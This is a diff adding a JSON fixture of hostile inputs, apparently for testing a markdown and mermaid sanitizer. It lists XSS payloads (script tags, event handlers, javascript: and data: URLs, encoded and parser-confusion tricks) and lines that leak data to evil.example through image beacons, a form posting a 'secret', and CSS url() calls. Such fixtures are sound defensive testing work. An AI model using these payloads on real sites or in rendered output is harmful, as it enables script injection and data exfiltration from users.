@@ -1,0 +1,44 @@
+{
+  "markdown_xss": [
+    "<script>alert(1)</script>",
+    "<img src=x onerror=alert(1)>",
+    "<svg onload=alert(1)>",
+    "<iframe src=\"javascript:alert(1)\"></iframe>",
+    "<a href=\"javascript:alert(1)\">click</a>",
+    "[click](javascript:alert(1))",
+    "[click](JavaScript:alert(1))",
+    "[click](   javascript:alert(1))",
+    "[click](data:text/html,<script>alert(1)</script>)",
+    "[click](vbscript:msgbox(1))",
+    "<details open ontoggle=alert(1)><summary>open</summary></details>",
+    "<object data=\"data:text/html,<script>alert(1)</script>\"></object>",
+    "<embed src=\"javascript:alert(1)\">",
+    "<form action=\"https://evil.example/steal\"><input name=\"secret\"><button>Submit</button></form>",
+    "<div style=\"background:url(https://evil.example/css)\">styled</div>",
+    "<style>body{background:url(https://evil.example/s)}</style>",
+    "<math><mtext><img src=x onerror=alert(1)></mtext></math>",
+    "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\"></noscript>",
+    "<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>",
+    "<a href=\"&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)\">encoded</a>",
+    "<input type=\"text\" onfocus=\"alert(1)\" autofocus>",
+    "<foreignObject><div><script>alert(1)</script></div></foreignObject>"
+  ],
+  "external_images": [
+    "![leak](https://evil.example/beacon?secret=123)",
+    "![leak](http://evil.example/p.png)",
+    "![leak](//evil.example/proto-rel.png)",
+    "[![leak](https://evil.example/img.svg)](https://example.com)",
+    "<img src=\"https://evil.example/raw.png\" alt=\"raw\">",
+    "![upper](HTTPS://EVIL.EXAMPLE/track.gif \"tracker\")",
+    "![ref-beacon][img1]\n\n[img1]: https://evil.example/ref.png"
+  ],
+  "mermaid_xss": [
+    "flowchart LR\n  A[\"<script>alert(1)</script>\"] --> B",
+    "flowchart LR\n  A[\"<img src=x onerror=alert(1)>\"] --> B",
+    "flowchart LR\n  A[\"<foreignObject><div>html</div></foreignObject>\"] --> B",
+    "flowchart LR\n  A[Click] --> B\n  click A \"javascript:alert(1)\"",
+    "sequenceDiagram\n  Alice->>Bob: <svg onload=alert(1)>",
+    "flowchart LR\n  A[Styled] --> B\n  style A fill:url(https://evil.example/leak),stroke:#333",
+    "flowchart LR\n  A[\"<iframe src=javascript:alert(1)></iframe>\"] --> B"
+  ]
+}
